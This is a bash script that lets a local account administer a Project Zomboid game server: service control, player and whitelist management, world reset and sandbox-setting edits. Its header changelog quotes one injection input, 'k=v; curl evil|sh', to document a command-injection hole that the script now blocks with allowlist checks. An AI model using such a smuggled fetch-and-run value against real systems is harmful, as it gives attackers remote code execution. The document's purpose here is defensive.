#!/usr/bin/env bash
# Version: 1.2.0
#
# 1.2.0 — mirrors hermes-zomboid-admin.sh 1.6.0's security fix: closed a real
# command-injection RCE where cmd_sandboxvar()/cmd_sandboxvars() spliced
# $key/$value unescaped into a command string handed to run() (bash -c) —
# sed_escape_repl() only escaped sed-replacement metacharacters, not shell
# ones. `sandboxvar 'k=v; curl evil|sh'` executed arbitrary code as whichever
# account runs this script, including the narrowly-scoped `zomboid-admin`
# account this fork exists specifically to hand out safely. Fixed with a
# strict allowlist on both key and value (same shapes as the remote
# version). Also added FIFO-injection guards: pz_console() now refuses a
# command containing a newline, and every user-management argument is
# rejected outright if it contains a literal double quote or newline.
#
# Local fork of hermes-zomboid-admin.sh, meant to run ON the Zomboid box
# itself (192.168.1.221) rather than over SSH from an admin machine. Same
# subcommands, same behavior — every `ssh_do "cmd"` from the remote version
# is just `run "cmd"` here (local execution, no network hop), and the PZ
# console FIFO is written to directly instead of through `ssh ... "cat >
# fifo"`. See hermes-zomboid-admin.sh's own header for the design rationale
# behind the console FIFO, the /help text inaccuracies (setaccesslevel
# wants lowercase, kick is not kickuser), and why RCON isn't used — all of
# that applies identically here, just accessed locally.
#
# Built for a case the remote tool doesn't cover: authorizing someone to
# administer this server *without* handing them the SSH private key or the
# `muncraft` account itself. The intended caller is a separate, dedicated
# local account (created alongside this script — see
# skills/zomboid-admin/SKILL.md for the exact account/permission setup)
# that is a supplementary member of the `muncraft` group and has narrowly
# scoped sudoers NOPASSWD rules for exactly the systemctl/journalctl calls
# below — nothing else. It does not have muncraft's own ALL:ALL sudo, does
# not own the game files, and cannot SSH out anywhere with muncraft's key.
#
# Requires (on this host, for whichever account runs it): membership in the
# `muncraft` group (for the console FIFO, SandboxVars.lua, and the account
# DB) and the sudoers NOPASSWD grant covering `systemctl
# {start,stop,restart,status,is-active} zomboid.service` and `journalctl -u
# zomboid.service`. No credentials live in this script.
set -uo pipefail

SERVER_DIR="/opt/zomboid/server"
FIFO="$SERVER_DIR/console.fifo"
STEAMCMD="/opt/zomboid/steamcmd/steamcmd.sh"
ACCOUNT_DB="/home/muncraft/Zomboid/db/zomboid.db"
SANDBOX_FILE="/home/muncraft/Zomboid/Server/zomboid_SandboxVars.lua"
INI_FILE="/home/muncraft/Zomboid/Server/zomboid.ini"
SAVE_DIR="/home/muncraft/Zomboid/Saves/Multiplayer/zomboid"

usage() {
  cat <<'EOF'
Usage: hermes-zomboid-admin-local.sh <command> [args...]
(Run this ON 192.168.1.221 itself — see hermes-zomboid-admin.sh for the
 same commands run remotely over SSH from an admin machine.)

Status / health:
  status                          Service state, ports, resource use, recent errors
  players                         List connected players
  logins                          All known accounts + role + last-connection timestamp
  auditlog                        Recent kick/ban actions (last 20)

Lifecycle:
  start | stop | restart          systemctl the service
  update | upgrade                Stop, steamcmd validate, start

World:
  newworld --confirm               Wipe the current map and start a fresh world with a new
                                    random seed. Whitelist, access levels, and ban/audit
                                    history are untouched (stored separately from the map
                                    save). Old save and zomboid.ini are moved/backed up with
                                    a timestamp, never deleted.

User management:
  adduser <user> [pass]           Add to whitelist (password optional)
  removeuser <user>                Remove from whitelist
  setaccesslevel <user> <level>   banned | user | priority | observer | gm | moderator | admin
                                   (lowercase — the server rejects the
                                   capitalized names its own /help text uses)
  setpassword <user> <newpass>    Change a user's password
  banuser <user> [reason]         Ban (add -ip manually via `console` for IP ban too)
  unbanuser <user>
  kick <user> [reason]

Sandbox settings (zombie spawn rate, loot, etc. — SandboxVars.lua):
  sandboxvars [key ...]           Report current settings: no args dumps the whole
                                   file; one or more names looks up just those keys.
  sandboxvar <key>=<value> [...]  Set one or more keys, back up the file, restart to apply.
                                   Values are raw Lua literals (0.65, true, "text").
                                   Example: sandboxvar PopulationMultiplier=1.2 RespawnHours=24

Other:
  broadcast <message>             servermsg to all connected players
  save                            Save the world now
  console <raw pz command>        Send any raw command verbatim, e.g.:
                                     console 'banuser "rj" -ip -r "spawn kill"'
EOF
}

run() { bash -c "$1"; }

# Sends $1 as a PZ console command via the FIFO directly (no SSH hop, so no
# `cat >` roundabout needed either — this account's group membership is
# what makes the FIFO writable at all).
#
# Refuses a command containing an embedded newline: the FIFO is one PZ
# command per line, so a newline inside a caller-supplied value (a kick
# reason, a broadcast message, ...) would otherwise let that value smuggle a
# second, unrelated console command past whatever built $cmd.
pz_console() {
  local cmd="$1"
  case "$cmd" in
    *$'\n'*|*$'\r'*)
      echo "ERROR: refusing to send a console command containing an embedded newline/carriage return (FIFO injection guard)" >&2
      return 1
      ;;
  esac
  echo "$cmd" > "$FIFO"
}

# Rejects $1 outright if it contains a literal double quote or an embedded
# newline/carriage return — see hermes-zomboid-admin.sh's own copy of this
# function for the full rationale.
reject_unsafe_console_arg() {
  case "$1" in
    *$'\n'*|*$'\r'*)
      echo "ERROR: argument '$1' contains a newline/carriage return — refused (PZ console injection guard)" >&2
      exit 1
      ;;
    *'"'*)
      echo "ERROR: argument '$1' contains a literal double quote — refused (PZ console injection guard)" >&2
      exit 1
      ;;
  esac
}

# Prints the journal lines logged since $1 (unix epoch seconds) — used right
# after pz_console to fetch just that command's response, not a stale match
# from an earlier boot (journalctl -u accumulates across restarts).
journal_since() {
  local epoch="$1"
  run "sudo -n journalctl -u zomboid.service --no-pager --since '@${epoch}'"
}

require_arg() {
  if [ -z "${1:-}" ]; then
    echo "ERROR: missing required argument" >&2
    usage >&2
    exit 1
  fi
}

cmd_status() {
  echo "=== zomboid.service ==="
  run "sudo -n systemctl status zomboid.service --no-pager -l | head -10"
  echo
  echo "=== Listening ports (16261/16262 udp) ==="
  run "ss -uln 2>/dev/null | grep -E '1626[12]' || echo 'not listening'"
  echo
  echo "=== Resource use ==="
  run "ps -o pid,rss,%cpu,etime,cmd -C ProjectZomboid64 --no-headers || echo 'process not found'"
  echo
  echo "=== Disk (server dir) ==="
  run "df -h $SERVER_DIR | tail -1"
  echo
  echo "=== Recent errors (last 200 log lines) ==="
  run "sudo -n journalctl -u zomboid.service --no-pager -n 200 | grep -iE 'error|exception' | tail -10 || echo 'none'"
  echo
  cmd_players
}

cmd_players() {
  local since
  since=$(date +%s)
  pz_console "players"
  sleep 2
  echo "=== Players ==="
  journal_since "$since" | grep -A1 'command entered.*"players"' | grep -v 'command entered' | tail -5
}

# The account/whitelist data isn't in a flat file like Minecraft's
# whitelist.json — it lives in the server's own SQLite save DB
# ($ACCOUNT_DB), read here via `python3`'s stdlib sqlite3 module since the
# sqlite3 CLI isn't installed on this host.
cmd_logins() {
  python3 - <<PYEOF
import sqlite3
con = sqlite3.connect("$ACCOUNT_DB")
cur = con.cursor()
cur.execute("""
    SELECT w.username, r.name, w.steamid, w.lastConnection
    FROM whitelist w LEFT JOIN role r ON w.role = r.id
    ORDER BY w.lastConnection IS NULL, w.lastConnection DESC
""")
rows = cur.fetchall()
if not rows:
    print("No accounts.")
else:
    print(f'{"USERNAME":<20} {"ROLE":<10} {"STEAMID":<20} LAST CONNECTION')
    for u, role, sid, last in rows:
        print(f'{u:<20} {(role or "?"):<10} {(sid or "-"):<20} {last or "never"}')
PYEOF
}

cmd_auditlog() {
  python3 - <<PYEOF
import sqlite3
con = sqlite3.connect("$ACCOUNT_DB")
cur = con.cursor()
cur.execute("SELECT username, type, text, issuedBy, lastUpdate FROM userlog ORDER BY id DESC LIMIT 20")
rows = cur.fetchall()
if not rows:
    print("No audit log entries.")
else:
    for u, typ, text, by, when in rows:
        reason = f" ({text})" if text else ""
        print(f'{when}  {typ:<8} {u:<20} by {by}{reason}')
PYEOF
}

cmd_lifecycle() {
  local action="$1"
  run "sudo -n systemctl $action zomboid.service"
  echo "$action: done"
  run "sudo -n systemctl is-active zomboid.service"
}

cmd_update() {
  echo "Stopping service..."
  run "sudo -n systemctl stop zomboid.service"
  echo "Running steamcmd validate (this can take a while)..."
  run "$STEAMCMD +force_install_dir $SERVER_DIR +login anonymous +app_update 380870 validate +quit"
  echo "Starting service..."
  run "sudo -n systemctl start zomboid.service"
  run "sudo -n systemctl is-active zomboid.service"
}

# Wipes the current map/world and makes the server generate a fresh one (new
# random seed) on next start. Deliberately does NOT touch $ACCOUNT_DB
# (whitelist, roles, ban/audit log all live there, in a directory separate
# from the map save under Saves/Multiplayer/) or anything in zomboid.ini
# besides Seed -- whitelisted users, their access levels, and ban history
# all carry over into the new world untouched. The old save and the prior
# zomboid.ini are moved aside with a timestamp rather than deleted, so a
# reset can be undone by hand if needed. Needs /home/muncraft/Zomboid/Server
# to be group-writable (chmod g+w -- done when this command shipped): sed
# -i's temp file needs directory write, not just file write, which is also
# what cmd_sandboxvar above has quietly needed all along.
#
# Recorded exception to IMPLEMENTATION_PLAN.md §5 constraint 5 -- see
# hermes-zomboid-admin.sh's own copy of this note for the full rationale.
# This account (zomboid-admin) is handed to a trusted human, not to an LLM
# persona; --confirm is the accepted gate for that trust model, same as
# hermes-synology-ssh.py's constraint-2 exception.
cmd_newworld() {
  if [ "${1:-}" != "--confirm" ]; then
    echo "ERROR: this wipes the current map (terrain, buildings, loot, zombies --" >&2
    echo "everything except accounts/whitelist/bans, which live separately and" >&2
    echo "are preserved). Rerun as: newworld --confirm" >&2
    exit 1
  fi

  echo "=== Current players (server is about to be stopped) ==="
  cmd_players
  echo

  echo "Stopping service..."
  run "sudo -n systemctl stop zomboid.service"

  local new_seed
  new_seed=$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c16)
  if [ -z "$new_seed" ]; then
    echo "ERROR: failed to generate a new seed, aborting before touching anything" >&2
    exit 1
  fi

  echo "Backing up zomboid.ini..."
  run "cp $INI_FILE ${INI_FILE}.bak.\$(date +%Y%m%d-%H%M%S)"

  echo "Setting new seed: $new_seed"
  run "sed -i -E 's/^Seed=.*/Seed=${new_seed}/' $INI_FILE"

  echo "Moving aside current world save (if any)..."
  run "if [ -d $SAVE_DIR ]; then mv $SAVE_DIR ${SAVE_DIR}.bak.\$(date +%Y%m%d-%H%M%S); else echo '  no existing save at $SAVE_DIR'; fi"

  echo "Starting service (first boot on a new world can take longer than a normal restart)..."
  run "sudo -n systemctl start zomboid.service"
  run "sudo -n systemctl is-active zomboid.service"

  echo
  echo "New world seed: $new_seed"
  echo "Accounts/whitelist/roles/bans preserved untouched ($ACCOUNT_DB)."
}

# Read-only report on the current SandboxVars content — the companion to
# cmd_sandboxvar below, which only ever writes. No args dumps the whole file
# (comment-only and blank lines stripped). Named args do an exact-key lookup.
cmd_sandboxvars() {
  if [ "$#" -eq 0 ]; then
    run "grep -vE '^[[:space:]]*(--|\$)' $SANDBOX_FILE"
    return
  fi
  local key line
  for key in "$@"; do
    if ! _valid_sandbox_key "$key"; then
      echo "$key: invalid key format, refused (must be a plain Lua identifier)" >&2
      continue
    fi
    line=$(run "grep -oE '^[[:space:]]*${key}[[:space:]]*=.*' $SANDBOX_FILE" | xargs)
    if [ -z "$line" ]; then
      echo "$key: not found"
    else
      echo "$line"
    fi
  done
}

# Escapes /, &, and \ so $1 is safe to drop into a sed 's///' replacement.
sed_escape_repl() { printf '%s' "$1" | sed -e 's/[\/&\\]/\\&/g'; }

# --- sandboxvar input validation --------------------------------------
# See hermes-zomboid-admin.sh's own copy of this comment for the full
# rationale: $key/$value get spliced into a command string handed to run()
# (bash -c), so both are checked against a strict allowlist before either
# ever reaches it, rather than trying to shell-escape an arbitrary string.
_valid_sandbox_key() {
  [[ "$1" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]]
}

_valid_sandbox_value() {
  [[ "$1" =~ ^-?[0-9]+(\.[0-9]+)?$ ]] && return 0
  [[ "$1" == "true" || "$1" == "false" ]] && return 0
  [[ "$1" =~ ^\"[A-Za-z0-9\ ,._-]*\"$ ]] && return 0
  return 1
}

# SandboxVars.lua is only read at server startup — unlike zomboid.ini,
# there's no live `reloadoptions` for it, so this always ends in a restart.
# Takes one or more key=value pairs; every key is checked to actually exist
# in the file *before* anything is written, so a typo fails loud instead of
# silently doing nothing.
cmd_sandboxvar() {
  if [ "$#" -eq 0 ]; then
    echo "ERROR: usage: sandboxvar <key>=<value> [<key2>=<value2> ...]" >&2
    exit 1
  fi

  local pair key value current
  echo "=== Validating keys against $SANDBOX_FILE ==="
  for pair in "$@"; do
    key="${pair%%=*}"
    value="${pair#*=}"
    if [ "$key" = "$pair" ] || [ -z "$value" ]; then
      echo "ERROR: bad pair '$pair', expected key=value" >&2
      exit 1
    fi
    if ! _valid_sandbox_key "$key"; then
      echo "ERROR: '$key' is not a valid Lua identifier — refused before touching the file" >&2
      exit 1
    fi
    if ! _valid_sandbox_value "$value"; then
      echo "ERROR: '$value' is not a recognized SandboxVars value shape (number, true/false, or a plain \"quoted string\") — refused before touching the file" >&2
      exit 1
    fi
    current=$(run "grep -oE '^[[:space:]]*${key}[[:space:]]*=[[:space:]]*[^,]+,' $SANDBOX_FILE")
    if [ -z "$current" ]; then
      echo "ERROR: no key '$key' found in $SANDBOX_FILE (Lua identifiers are case-sensitive — check spelling/case)" >&2
      exit 1
    fi
    echo "  $key: currently '$(echo "$current" | xargs)' -> setting to $value"
  done

  echo "Backing up SandboxVars..."
  run "cp $SANDBOX_FILE ${SANDBOX_FILE}.bak.\$(date +%Y%m%d-%H%M%S)"

  echo "Applying changes..."
  for pair in "$@"; do
    key="${pair%%=*}"
    value="${pair#*=}"
    local esc_value
    esc_value=$(sed_escape_repl "$value")
    run "sed -i -E 's/^([[:space:]]*)${key}([[:space:]]*=[[:space:]]*)[^,]+,/\1${key}\2${esc_value},/' $SANDBOX_FILE"
  done

  echo "Restarting service to load the new SandboxVars (they're read only at startup)..."
  cmd_lifecycle restart
}

cmd_console() {
  require_arg "${1:-}"
  local since
  since=$(date +%s)
  pz_console "$1"
  sleep 2
  journal_since "$since" | grep -v 'command entered via server console'
}

case "${1:-}" in
  status|health)      cmd_status ;;
  players)             cmd_players ;;
  logins)               cmd_logins ;;
  auditlog)             cmd_auditlog ;;
  start)                cmd_lifecycle start ;;
  stop)                 cmd_lifecycle stop ;;
  restart)              cmd_lifecycle restart ;;
  update|upgrade)      cmd_update ;;
  newworld)
    shift
    cmd_newworld "$@"
    ;;
  sandboxvars)
    shift
    cmd_sandboxvars "$@"
    ;;
  sandboxvar)
    shift
    cmd_sandboxvar "$@"
    ;;
  console)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    cmd_console "$2"
    ;;
  adduser)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    if [ -n "${3:-}" ]; then
      reject_unsafe_console_arg "$3"
      cmd_console "adduser \"$2\" \"$3\""
    else
      cmd_console "adduser \"$2\""
    fi
    ;;
  removeuser)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    cmd_console "removeuserfromwhitelist \"$2\""
    ;;
  setaccesslevel)
    require_arg "${2:-}"; require_arg "${3:-}"
    reject_unsafe_console_arg "$2"; reject_unsafe_console_arg "$3"
    cmd_console "setaccesslevel \"$2\" \"$3\""
    ;;
  setpassword)
    require_arg "${2:-}"; require_arg "${3:-}"
    reject_unsafe_console_arg "$2"; reject_unsafe_console_arg "$3"
    cmd_console "setpassword \"$2\" \"$3\""
    ;;
  banuser)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    if [ -n "${3:-}" ]; then
      reject_unsafe_console_arg "$3"
      cmd_console "banuser \"$2\" -r \"$3\""
    else
      cmd_console "banuser \"$2\""
    fi
    ;;
  unbanuser)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    cmd_console "unbanuser \"$2\""
    ;;
  kick)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    if [ -n "${3:-}" ]; then
      reject_unsafe_console_arg "$3"
      cmd_console "kick \"$2\" -r \"$3\""
    else
      cmd_console "kick \"$2\""
    fi
    ;;
  broadcast)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    cmd_console "servermsg \"$2\""
    ;;
  save)
    cmd_console "save"
    ;;
  *)
    usage
    exit 1
    ;;
esac
